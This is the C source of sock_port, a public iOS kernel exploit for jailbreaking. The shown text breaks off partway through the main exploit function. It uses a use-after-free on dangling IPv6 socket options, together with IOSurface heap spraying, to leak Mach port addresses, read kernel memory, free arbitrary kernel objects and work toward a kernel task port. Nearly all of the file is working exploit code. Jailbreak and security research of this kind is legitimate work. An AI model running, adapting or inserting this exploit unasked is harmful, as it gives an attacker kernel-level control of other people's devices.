//
//  exploit.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//
// Released under the GNU GPL v3 at https://github.com/jakeajames/sock_port

#import <Foundation/Foundation.h> // This is just for PWN_LOG, not strictly necessary

#include <assert.h>
#include <errno.h>
#include <mach-o/loader.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <unistd.h>

#include <shared/iokit.h>
#include <shared/offsets.h>

#ifdef __LP64__
#define MACHO_HEADER_MAGIC MH_MAGIC_64
#else
#define MACHO_HEADER_MAGIC MH_MAGIC
#define KERNEL_SEARCH_ADDRESS 0x81200000
#endif
#define IPV6_USE_MIN_MTU 42
#define IPV6_PKTINFO 46
#define IPV6_PREFER_TEMPADDR 63
#define IO_BITS_ACTIVE 0x80000000
#define IOT_PORT 0
#define IKOT_TASK 2
#define IKOT_CLOCK 25
#define IKOT_IOKIT_CONNECT 29
#define kOSSerializeBinarySignature 0x000000D3U
#define WQT_QUEUE 0x2
#define _EVENT_MASK_BITS ((sizeof(uint32_t) * 8) - 7)

#include <mach/vm_region.h>
#define VM_KERN_MEMORY_CPU 9

typedef int* vm_region_info_t;
typedef mach_port_t vm_map_read_t;
kern_return_t mach_vm_region(vm_map_read_t target_task, mach_vm_address_t* address, mach_vm_size_t* size, vm_region_flavor_t flavor, vm_region_info_t info, mach_msg_type_number_t* infoCnt, mach_port_t* object_name);
kern_return_t mach_vm_read_overwrite(vm_map_read_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t* outsize);
static kern_return_t
kread_buf(kptr_t addr, void* buf, mach_vm_size_t sz, mach_port_t tfp0)
{
    mach_vm_address_t p = (mach_vm_address_t)buf;
    mach_vm_size_t read_sz, out_sz = 0;

    while (sz != 0) {
        read_sz = MIN(sz, vm_kernel_page_size - (addr & vm_kernel_page_mask));
        if (mach_vm_read_overwrite(tfp0, addr, read_sz, p, &out_sz) != KERN_SUCCESS || out_sz != read_sz) {
            return KERN_FAILURE;
        }
        p += read_sz;
        sz -= read_sz;
        addr += read_sz;
    }
    return KERN_SUCCESS;
}

static kern_return_t
kread_addr(kptr_t addr, kptr_t* val, mach_port_t tfp0)
{
    return kread_buf(addr, val, sizeof(*val), tfp0);
}

#define LOG(...) printf(__VA_ARGS__)
#define kr32(addr, value)                                                      \
    if (SMAP) {                                                                \
        read(port_fds[0], (void*)fakeport, sizeof(kport_t) + fake_task_size);  \
    }                                                                          \
    *read_addr_ptr = addr - koffset(socket.proc_pid);                          \
    if (SMAP) {                                                                \
        write(port_fds[1], (void*)fakeport, sizeof(kport_t) + fake_task_size); \
    }                                                                          \
    value = 0x0;                                                               \
    ret = pid_for_task(our_port, (int*)&value);

uint32_t read64_tmp;
#define kr64(addr, value)         \
    kr32(addr + 0x4, read64_tmp); \
    kr32(addr, value);            \
    value = value | ((uint64_t)read64_tmp << 32)

#ifdef __LP64__
#define kr_kptr(addr, value) kr64(addr, value)
#else
#define kr_kptr(addr, value) kr32(addr, value)
#endif

#define kernel_read_kptr_check(addr) ({ kptr_t r; r = kernel_read_kptr_via_uaf(addr, offsets); if (!r) { usleep(100); r = kernel_read_kptr_via_uaf(addr, offsets); if (!r) { LOG("[-] failed to read from '"#addr"'\n"); goto err;}}; r; })
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t* address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t* outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t* data, mach_msg_type_number_t* dataCnt);

static void init_kernel_memory(mach_port_t tfp0);

static size_t kernel_read(kptr_t where, void* p, size_t size);
static kptr_t kernel_read_kptr(kptr_t where);

static size_t kernel_write(kptr_t where, const void* p, size_t size);
static void kernel_write_32(kptr_t where, uint32_t what);
static void kernel_write_kptr(kptr_t where, kptr_t what);

static void _kfree(mach_vm_address_t address, vm_size_t size);
static kptr_t _kalloc(vm_size_t size);

kptr_t find_port(mach_port_name_t port, kptr_t task_self, offsets_t* offsets);

struct ool_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct route_in6 {
    struct rtentry* ro_rt;
    struct llentry* ro_lle;
    struct ifaddr* ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};

struct ip6po_rhinfo {
    struct ip6_rthdr* ip6po_rhi_rthdr; /* Routing header */
    struct route_in6 ip6po_rhi_route; /* Route to the 1st hop */
};

struct ip6po_nhinfo {
    struct sockaddr* ip6po_nhi_nexthop;
    struct route_in6 ip6po_nhi_route; /* Route to the nexthop */
};

struct ip6_pktopts {
    struct mbuf* ip6po_m;
    int ip6po_hlim;
    struct in6_pktinfo* ip6po_pktinfo;
    struct ip6po_nhinfo ip6po_nhinfo;
    struct ip6_hbh* ip6po_hbh;
    struct ip6_dest* ip6po_dest1;
    struct ip6po_rhinfo ip6po_rhinfo;
    struct ip6_dest* ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};

typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        kptr_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
#ifdef __LP64__
            uint32_t pad;
#endif
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    kptr_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

typedef struct {
    struct {
        kptr_t data;
        uint32_t reserved : 24,
            type : 8;
#ifdef __LP64__
        uint32_t pad;
#endif
    } lock; // mutex lock
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
#ifdef __LP64__
    uint32_t pad;
#endif
    kptr_t map;
} ktask_t;

union waitq_flags {
    struct {
        uint32_t /* flags */
            waitq_type : 2, /* only public field */
            waitq_fifo : 1, /* fifo wakeup policy? */
            waitq_prepost : 1, /* waitq supports prepost? */
            waitq_irq : 1, /* waitq requires interrupts disabled */
            waitq_isvalid : 1, /* waitq structure is valid */
            waitq_turnstile_or_port : 1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
            waitq_eventmask : _EVENT_MASK_BITS;
    };
    uint32_t flags;
};

static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition);

extern mach_vm_size_t pagesize;

static int init_IOSurface(offsets_t* offsets);

// The IOSurfaceRoot service.
mach_port_t IOSurfaceRoot;

// An IOSurfaceRootUserClient instance.
mach_port_t IOSurfaceRootUserClient;

// The ID of the IOSurface we're using.
uint32_t IOSurface_id;

/*
 * IOSurface_init
 *
 * Description:
 *     Initialize the IOSurface subsystem.
 */
static bool IOSurface_init(offsets_t* offsets);

/*
 * IOSurface_deinit
 *
 * Description:
 *     Tear down the IOSurface subsystem. Any sprayed memory will be automatically deallocated.
 */
static void IOSurface_deinit(void);

/*
 * IOSurface_spray_with_gc
 *
 * Description:
 *     Spray kernel memory using IOSurface properties.
 *
 *     The current implementation stores each data allocation in an OSString. The reason for this
 *     is that OSString contents will be allocated using _kalloc() even for allocations larger than
 *     the page size. OSData on the other hand will use kmem_alloc() for large allocations.
 *     Consequently, the last byte of data will be zeroed out to create a null terminator.
 */
static bool IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
    void* data, uint32_t data_size, offsets_t* offsets,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size));

// ---- IOSurface types ---------------------------------------------------------------------------

struct _IOSurfaceFastCreateArgs {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
};

struct IOSurfaceLockResult {
    uint64_t addr1;
    uint64_t addr2;
    uint64_t addr3;
    uint32_t surface_id;
    uint8_t _pad2[0xdd0 - 0x18 - 0x4];
};

struct IOSurfaceValueArgs {
    uint32_t surface_id;
    uint32_t _out1;
    union {
        uint32_t xml[0];
        char string[0];
    };
};

struct IOSurfaceValueArgs_string {
    uint32_t surface_id;
    uint32_t _out1;
    uint32_t string_data;
    char null;
};

struct IOSurfaceValueResultArgs {
    uint32_t out;
};

static bool IOSurface_set_value(const struct IOSurfaceValueArgs* args, size_t args_size);

/*
 * iosurface.c
 * Brandon Azad
 */

// ---- Global variables --------------------------------------------------------------------------

// Is the IOSurface subsystem initialized?
static bool IOSurface_initialized;

// ---- Functions ---------------------------------------------------------------------------------

#define ERROR(str, ...) LOG("[-] " str, ##__VA_ARGS__)
static bool IOSurface_init(offsets_t* offsets)
{
    if (IOSurface_initialized) {
        return true;
    }
    IOSurfaceRoot = IOServiceGetMatchingService(
        kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));
    if (IOSurfaceRoot == MACH_PORT_NULL) {
        ERROR("could not find %s", "IOSurfaceRoot");
        return false;
    }
    kern_return_t kr = IOServiceOpen(
        IOSurfaceRoot,
        mach_task_self(),
        0,
        &IOSurfaceRootUserClient);
    if (kr != KERN_SUCCESS) {
        ERROR("could not open %s", "IOSurfaceRootUserClient");
        return false;
    }
    struct _IOSurfaceFastCreateArgs create_args = {
        .alloc_size = 0x4000,
    };
    struct IOSurfaceLockResult lock_result;

    size_t lock_result_size = offsets->iosurface.create_outsize;
    kr = IOConnectCallMethod(
        IOSurfaceRootUserClient,
        6, // create_surface_client_fast_path
        NULL, 0,
        &create_args, sizeof(create_args),
        NULL, NULL,
        &lock_result, &lock_result_size);
    if (kr != KERN_SUCCESS) {
        ERROR("could not create %s: 0x%x", "IOSurfaceClient", kr);
        return false;
    }
    IOSurface_id = lock_result.surface_id;
    if (!IOSurface_id) {
        IOSurface_id = (uint32_t)lock_result.addr3;
    }
    IOSurface_initialized = true;
    return true;
}

static void IOSurface_deinit()
{
    assert(IOSurface_initialized);
    IOSurface_initialized = false;
    IOSurface_id = 0;
    IOServiceClose(IOSurfaceRootUserClient);
    IOObjectRelease(IOSurfaceRoot);
}

/*
 * IOSurface_set_value
 *
 * Description:
 *     A wrapper around IOSurfaceRootUserClient::set_value().
 */
static bool IOSurface_set_value(const struct IOSurfaceValueArgs* args, size_t args_size)
{
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
        IOSurfaceRootUserClient,
        9, // set_value
        NULL, 0,
        args, args_size,
        NULL, NULL,
        &result, &result_size);
    if (kr != KERN_SUCCESS) {
        ERROR("failed to %s value in %s: 0x%x", "set", "IOSurface", kr);
        return false;
    }
    return true;
}

/*
 * base255_encode
 *
 * Description:
 *     Encode an integer so that it does not contain any null bytes.
 */
static uint32_t
base255_encode(uint32_t value)
{
    uint32_t encoded = 0;
    for (unsigned i = 0; i < sizeof(value); i++) {
        encoded |= ((value % 255) + 1) << (8 * i);
        value /= 255;
    }
    return encoded;
}

/*
 * xml_units_for_data_size
 *
 * Description:
 *     Return the number of XML units needed to store the given size of data in an OSString.
 */
static size_t
xml_units_for_data_size(size_t data_size)
{
    return ((data_size - 1) + sizeof(uint32_t) - 1) / sizeof(uint32_t);
}

/*
 * serialize_IOSurface_data_array
 *
 * Description:
 *     Create the template of the serialized array to pass to IOSurfaceUserClient::set_value().
 *     Returns the size of the serialized data in bytes.
 */
static size_t
serialize_IOSurface_data_array(uint32_t* xml0, uint32_t array_length, uint32_t data_size,
    uint32_t** xml_data, uint32_t** key)
{
    uint32_t* xml = xml0;
    *xml++ = kOSSerializeBinarySignature;
    *xml++ = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    *xml++ = kOSSerializeArray | array_length;
    for (size_t i = 0; i < array_length; i++) {
        uint32_t flags = (i == array_length - 1 ? kOSSerializeEndCollection : 0);
        *xml++ = kOSSerializeData | (data_size - 1) | flags;
        xml_data[i] = xml;
        xml += xml_units_for_data_size(data_size);
    }
    *xml++ = kOSSerializeSymbol | sizeof(uint32_t) + 1 | kOSSerializeEndCollection;
    *key = xml++; // This will be filled in on each array loop.
    *xml++ = 0; // Null-terminate the symbol.
    return (xml - xml0) * sizeof(*xml);
}

/*
 * IOSurface_spray_with_gc_internal
 *
 * Description:
 *     A generalized version of IOSurface_spray_with_gc() and IOSurface_spray_size_with_gc().
 */

static uint32_t total_arrays = 0;
static bool
IOSurface_spray_with_gc_internal(uint32_t array_count, uint32_t array_length, uint32_t extra_count,
    void* data, uint32_t data_size, offsets_t* offsets,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size))
{
    assert(array_count <= 0xffffff);
    assert(array_length <= 0xffff);
    assert(data_size <= 0xffffff);
    assert(extra_count < array_count);
    // Make sure our IOSurface is initialized.
    bool ok = IOSurface_init(offsets);
    if (!ok) {
        return 0;
    }
    // How big will our OSUnserializeBinary dictionary be?
    uint32_t current_array_length = array_length + (extra_count > 0 ? 1 : 0);
    size_t xml_units_per_data = xml_units_for_data_size(data_size);
    size_t xml_units = 1 + 1 + 1 + (1 + xml_units_per_data) * current_array_length + 1 + 1 + 1;
    // Allocate the args struct.
    struct IOSurfaceValueArgs* args;
    size_t args_size = sizeof(*args) + xml_units * sizeof(args->xml[0]);
    args = malloc(args_size);
    assert(args != 0);
    // Build the IOSurfaceValueArgs.
    args->surface_id = IOSurface_id;
    // Create the serialized OSArray. We'll remember the locations we need to fill in with our
    // data as well as the slot we need to set our key.
    uint32_t** xml_data = malloc(current_array_length * sizeof(*xml_data));
    assert(xml_data != NULL);
    uint32_t* key;
    size_t xml_size = serialize_IOSurface_data_array(args->xml,
        current_array_length, data_size, xml_data, &key);
    assert(xml_size == xml_units * sizeof(args->xml[0]));
    // Keep track of when we need to do GC.
    // size_t sprayed = 0;
    size_t next_gc_step = 0;
    // Loop through the arrays.
    for (uint32_t array_id = 0; array_id < array_count; array_id++) {
        // If we've crossed the GC sleep boundary, sleep for a bit and schedule the
        // next one.
        // Now build the array and its elements.
        *key = base255_encode(total_arrays + array_id);
        for (uint32_t data_id = 0; data_id < current_array_length; data_id++) {
            // Update the data for this spray if the user requested.
            if (callback != NULL) {
                callback(array_id, data_id, data, data_size);
            }
            // Copy in the data to the appropriate slot.
            memcpy(xml_data[data_id], data, data_size - 1);
        }
        // Finally set the array in the surface.
        ok = IOSurface_set_value(args, args_size);
        if (!ok) {
            free(args);
            free(xml_data);
            return false;
        }
        if (ok) {
            // sprayed += data_size * current_array_length;
            // If we just sprayed an array with an extra element, decrement the
            // outstanding extra_count.
            if (current_array_length > array_length) {
                assert(extra_count > 0);
                extra_count--;
                // If our extra_count is now 0, rebuild our serialized array. (We
                // could implement this as a memmove(), but I'm lazy.)
                if (extra_count == 0) {
                    current_array_length--;
                    serialize_IOSurface_data_array(args->xml,
                        current_array_length, data_size,
                        xml_data, &key);
                }
            }
        }
    }
    if (next_gc_step > 0) {
        // LOG("\n");
    }
    // Clean up resources.
    free(args);
    free(xml_data);
    total_arrays += array_count;
    return true;
}

static bool IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
    void* data, uint32_t data_size, offsets_t* offsets,
    void (^callback)(uint32_t array_id, uint32_t data_id, void* data, size_t size))
{
    return IOSurface_spray_with_gc_internal(array_count, array_length, 0,
        data, data_size, offsets, callback);
}

mach_vm_size_t pagesize = 0;

static int init_IOSurface(offsets_t* offsets)
{
    kern_return_t ret = KERN_SUCCESS;
    ret = _host_page_size(mach_host_self(), (vm_size_t*)&pagesize);
    LOG("[i] page size: 0x%llx, %s\n", pagesize, mach_error_string(ret));
    if (ret != KERN_SUCCESS) {
        LOG("[-] failed to get page size! ret: %x %s\n", ret, mach_error_string(ret));
        return ret;
    }
    return !IOSurface_init(offsets);
}

//
//  kernel_memory.c
//  sock_port
//
//  Created by Jake James on 7/18/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//
static mach_port_t tfpzero;

static size_t kernel_read(kptr_t where, void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            LOG("[-] error on kernel_read(0x%016llx)\n", where);
            break;
        }
        offset += sz;
    }
    return offset;
}

static kptr_t kernel_read_kptr(kptr_t where)
{
    kptr_t out;
    kernel_read(where, &out, sizeof(kptr_t));
    return out;
}

static size_t kernel_write(kptr_t where, const void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfpzero, where + offset, (kptr_t)p + offset, (int)chunk);
        if (rv) {
            LOG("[-] error on kernel_write(0x%016llx)\n", where);
            break;
        }
        offset += chunk;
    }
    return offset;
}

static void kernel_write_32(kptr_t where, uint32_t what)
{
    uint32_t _what = what;
    kernel_write(where, &_what, sizeof(uint32_t));
}

static void kernel_write_kptr(kptr_t where, kptr_t what)
{
    kptr_t _what = what;
    kernel_write(where, &_what, sizeof(kptr_t));
}

static void init_kernel_memory(mach_port_t tfp0)
{
    tfpzero = tfp0;
}

static void _kfree(mach_vm_address_t address, vm_size_t size)
{
    mach_vm_deallocate(tfpzero, address, size);
}

static kptr_t _kalloc(vm_size_t size)
{
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfpzero, (mach_vm_address_t*)&address, size, VM_FLAGS_ANYWHERE);
    return (kptr_t)address;
}

// utilities to manipulate sockets
static int set_minmtu(int sock, int* minmtu)
{
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

static int get_minmtu(int sock, int* minmtu)
{
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

static int get_prefertempaddr(int sock, int* prefertempaddr)
{
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

static int get_pktinfo(int sock, struct in6_pktinfo* pktinfo)
{
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

static int set_pktinfo(int sock, struct in6_pktinfo* pktinfo)
{
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

// free the pktopts struct of the socket to get ready for UAF
static int free_socket_options(int sock)
{
    return disconnectx(sock, 0, 0);
}

// return a socket we can UAF on
static int get_socket()
{
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        LOG("[-] Can't get socket, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = { .npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT };
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {
        LOG("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    return sock;
}

// return a socket ready for UAF
static int get_socket_with_dangling_options()
{
    int socket = get_socket();
    int minmtu = -1;
    set_minmtu(socket, &minmtu);
    free_socket_options(socket);
    return socket;
}

static mach_port_t new_port()
{
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        LOG("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        LOG("[-] Failed to insert right (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    return port;
}

//
//  exploit_utilities.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#define koffset(name) offsets->name

kptr_t find_port(mach_port_name_t port, kptr_t task_self, offsets_t* offsets)
{
    kptr_t task_addr = kernel_read_kptr(task_self + koffset(socket.ipc_port_ip_kobject));
    kptr_t itk_space = kernel_read_kptr(task_addr + koffset(socket.task_itk_space));
    kptr_t is_table = kernel_read_kptr(itk_space + koffset(socket.ipc_space_is_table));

    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = koffset(socket.size_ipc_entry);

    kptr_t port_addr = kernel_read_kptr(is_table + (port_index * sizeof_ipc_entry_t));

    return port_addr;
}

// from Ian Beer. make a kernel allocation with the kernel address of 'target_port', 'count' times
static mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition)
{
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        LOG("[-] failed to allocate port\n");
        return 0;
    }

    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }

    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));

    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0xdeadbeef;

    msg->body.msgh_descriptor_count = 1;

    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    err = mach_msg(&msg->hdr,
        MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
        msg->hdr.msgh_size,
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);

    if (err != KERN_SUCCESS) {
        LOG("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }

    return q;
}

// first primitive: leak the kernel address of a mach port
static kptr_t find_port_via_uaf(mach_port_t port, int disposition)
{
    // here we use the uaf as an info leak
    int sock = get_socket_with_dangling_options();

    for (int i = 0; i < 0x10000; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
#ifdef __LP64__
#define num_pointers_ip6 sizeof(struct ip6_pktopts)
#else
#define num_pointers_ip6 (sizeof(struct ip6_pktopts) - 7)
#endif
        mach_port_t p = fill_kalloc_with_port_pointer(port, num_pointers_ip6 / sizeof(kptr_t), MACH_MSG_TYPE_COPY_SEND);

        int mtu;
        int pref;
        get_minmtu(sock, &mtu); // this is like doing kernel_read_32(options + 180);
        get_prefertempaddr(sock, &pref); // this like kernel_read_32(options + 184);

        // since we wrote 192/sizeof(uint64_t) pointers, reading like this would give us the second half of kernel_read_64(options + 184) and the fist half of kernel_read_64(options + 176)

        /*  from a hex dump:

         (lldb) p/x HexDump(options, 192)
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
         ...
         XX XX XX XX F0 FF FF FF  XX XX XX XX F0 FF FF FF  |  ................
                    |-----------||-----------|
                     minmtu here prefertempaddr here
         */

        // the ANDing here is done because for some reason stuff got wrong. say pref = 0xdeadbeef and mtu = 0, ptr would come up as 0xffffffffdeadbeef instead of 0x00000000deadbeef. I spent a day figuring out what was messing things up

#ifdef __LP64__
        kptr_t ptr = (((kptr_t)mtu << 32) & 0xffffffff00000000) | ((kptr_t)pref & 0x00000000ffffffff);
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef) {
#else
        kptr_t ptr = mtu;
        if (mtu != 0xffffffff && mtu != 0 && pref != 0xdeadbeef && mtu == pref) {
#endif
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
        mach_port_destroy(mach_task_self(), p);
    }

    // close that socket.
    close(sock);
    return 0;
}

// function to cache our task port kernel address
static kptr_t _task_self_addr()
{
    static kptr_t cached_task_self_addr = 0;
    if (cached_task_self_addr) {
        return cached_task_self_addr;
    } else {
        cached_task_self_addr = find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
        return cached_task_self_addr;
    }
}

// second primitive: read 20 bytes from addr
// third primitive: free a _kalloced object at an arbitrary address
static void* primitive(kptr_t addr, bool read, offsets_t* offsets)
{
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }

    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts* fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x13371337; // give a number we can recognize
    *(uint32_t*)((uint64_t)fake_opts + OFFSET_IP6PO_MINMTU) = 0x13371337; // on iOS 10, offset is different
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;

    bool found = false;
    int found_at = -1;

    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
#ifdef __LP64__
#define spray_size sizeof(struct ip6_pktopts)
#else
#define spray_size (sizeof(struct ip6_pktopts) - 8)
#endif
        IOSurface_spray_with_gc(32, 256, (void*)fake_opts, (uint32_t)spray_size, offsets, NULL);

        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x13371337) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found)
            break;
    }

    free(fake_opts);

    if (!found) {
        if (read) {
            LOG("[-] Failed to read kernel\n");
            return 0;
        } else {
            LOG("[-] failed to setup freeing primitive\n");
            return (void*)(unsigned)-1;
        }
    }

    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }

    if (read) {
        void* buf = malloc(sizeof(struct in6_pktinfo));
        get_pktinfo(sockets[found_at], (struct in6_pktinfo*)buf);
        close(sockets[found_at]);

        return buf;
    }

    struct in6_pktinfo* buf = malloc(sizeof(struct in6_pktinfo));
    memset(buf, 0, sizeof(struct in6_pktinfo));

    int ret = set_pktinfo(sockets[found_at], buf);
    free(buf);
    return (void*)(kptr_t)ret;
}

static kptr_t kernel_read_kptr_via_uaf(kptr_t addr, offsets_t* offsets)
{
    void* buf = primitive(addr, true, offsets);
    if (buf) {
        kptr_t r = *(kptr_t*)buf;
        free(buf);
        return r;
    }
    return 0;
}

static inline uint32_t mach_port_waitq_flags()
{
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type = WQT_QUEUE;
    waitq_flags.waitq_fifo = 1;
    waitq_flags.waitq_prepost = 0;
    waitq_flags.waitq_irq = 0;
    waitq_flags.waitq_isvalid = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

kptr_t self_port_addr;
kern_return_t pwn_kernel_sock_port(offsets_t* offsets, task_t* tfp0, kptr_t* kbase, void* controller, void (*sendLog)(void*, NSString*))
{
#define PWN_LOG(...)                                                   \
    do {                                                               \
        sendLog(controller, [NSString stringWithFormat:@__VA_ARGS__]); \
        LOG(__VA_ARGS__);                                              \
    } while (0)
#ifdef __LP64__
#define PWN_LOG_KPTR(...) PWN_LOG("%s %llx\n", __VA_ARGS__)
#else
#define PWN_LOG_KPTR(...) PWN_LOG("%s %x\n", __VA_ARGS__)
#endif
#define updateStage(stage) PWN_LOG("Jailbreaking... (%d/21)", stage)

    updateStage(1);

    PWN_LOG("[!] exploit started!\n");
    clock_t t = clock();

    kern_return_t ret = init_IOSurface(offsets);
    if (ret) {
        PWN_LOG("[-] can't init IOSurface!\n");
        return MACH_PORT_NULL;
    }
    PWN_LOG("[+] initialized IOSurface\n");

#ifdef __LP64__
    bool SMAP = false;
#else
    bool SMAP = true; // For some reason this helps (TODO: figure out this)
#endif

    if (pagesize == 0x4000) {
        struct utsname a;
        uname(&a);
        if (!strstr(a.machine, "iPad5,") && !strstr(a.machine, "iPad6,") && !strstr(a.machine, "iPhone8,")) {
            PWN_LOG("[i] detected SMAP device\n");
            SMAP = true;
        }
    }

    self_port_addr = _task_self_addr(); // port leak primitive
    if (!self_port_addr) {
        PWN_LOG("[-] failed to leak our task port address!\n");
        goto err;
    }

    PWN_LOG_KPTR("[i] our task port:", self_port_addr);

    // kernel read primitive
    kptr_t ipc_space_kernel = kernel_read_kptr_via_uaf(self_port_addr + koffset(socket.ipc_port_ip_receiver), offsets);
    if (!ipc_space_kernel) {
